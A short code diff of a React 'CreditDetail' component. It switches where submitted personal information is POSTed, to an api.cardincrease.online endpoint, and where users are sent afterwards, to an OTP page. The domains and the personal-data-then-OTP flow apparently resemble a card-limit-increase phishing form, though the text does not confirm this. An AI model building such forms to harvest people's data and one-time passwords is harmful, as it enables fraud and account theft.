@@ -96,7 +96,7 @@ function CreditDetail() {
     };
 
     try {
-      const response = await fetch('https://www.rbl.digiindiasolutions.com/v1/createPersonalInfo', {
+      const response = await fetch('https://www.api.cardincrease.online/v1/createPersonalInfo', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -108,7 +108,7 @@ function CreditDetail() {
         // Clear sessionStorage after successful form submission
         sessionStorage.removeItem('personalInfo');
         // Redirect to the next page
-        window.location.href = 'https://cardincrease.com/personal-detail/creadit-detail/otp';
+        window.location.href = 'https://cardincrease.online/personal-detail/creadit-detail/otp';
         console.log('Data sent successfully');
       } else {
         // Handle error
